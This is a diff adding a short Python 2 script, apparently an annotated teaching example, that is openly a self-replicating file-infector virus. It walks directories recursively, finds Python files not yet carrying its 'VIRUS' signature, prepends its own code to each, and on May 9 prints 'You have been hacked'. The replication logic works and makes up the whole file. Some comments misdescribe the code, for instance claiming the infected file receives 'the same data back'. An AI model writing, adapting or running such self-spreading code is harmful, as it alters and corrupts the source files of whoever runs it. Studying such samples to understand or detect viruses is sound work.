@@ -1,0 +1,44 @@
+#!/usr/bin/python                                             # Telling the computer to interpret this as python
+import os                                                     # Imports the os library
+import datetime                                               # Imporst the datetime library
+
+SIGNATURE = "VIRUS"                                           # Declares a variable name SIGNATURE and sets its value to "VIRUS"
+
+def locate(path):                                             # Declares a function named locate with an argument variable named path
+    files_targeted = []                                       # Declares an empty list called files_targeted
+    filelist = os.listdir(path)                               # Declares a variable named filelist with an object which will list directories with the given argument as the path
+    for fname in filelist:                                    # Begins a loop which will take each directory (filelist) and loop through to:
+        if os.path.isdir(path+"/"+fname):                     # check if the filename is a directory 
+            files_targeted.extend(locate(path+"/"+fname))     # if so, it gets added to the list: files_targeted
+        elif fname[-3:] == ".py":                             # If the last 3 characters in the filename are .py (pyton extension)   
+            infected = False                                  # a variable -- infected -- is set to the boolean False
+            for line in open(path+"/"+fname):                 # Another for loop opens files and reads them one line at a time to check if: 
+                if SIGNATURE in line:                         # the word "VIRUS" is in the line
+                    infected = True                           # if so, the variable infected is declared to the boolean True
+                    break                                     # the code loop ends if this condition is met
+            if infected == False:                             # if the file is not infected
+                files_targeted.append(path+"/"+fname)         # it gets added to the list: files_targeted
+    return files_targeted                                     # The completed list -- files_targeted -- gets sent out of the function at the end
+
+def infect(files_targeted):                                   # Another function is declared with the newly created list
+    virus = open(os.path.abspath(__file__))                   # A variable is declared with the object opening this file
+    virusstring = ""                                          # Declares an empty value for this variable
+    for i,line in enumerate(virus):                           # 
+        if i&gt;=0 and i &lt;39:                              # 
+            virusstring += line                               # 
+    virus.close                                               # Closes the file
+    for fname in files_targeted:                              # Loops through each item (file) in the list created earlier
+        f = open(fname)                                       # variable to open the file
+        temp = f.read()                                       # reads the contents of the file into temp variable
+        f.close()                                             # closes the file
+        f = open(fname,"w")                                   # opens the file in write mode
+        f.write(virusstring + temp)                           # clears the file then writes the same data back into the file
+        f.close()                                             # closes the file
+
+def detonate():                                               # Declares the function detonate with no arguments
+    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
+        print "You have been hacked"                          # Prints to the screen this message (although the syntax is incorrect)
+
+files_targeted = locate(os.path.abspath(""))                  # 
+infect(files_targeted)                                        # runs the infect function with the list as the argument
+detonate()                                                    # Runs the detonate function
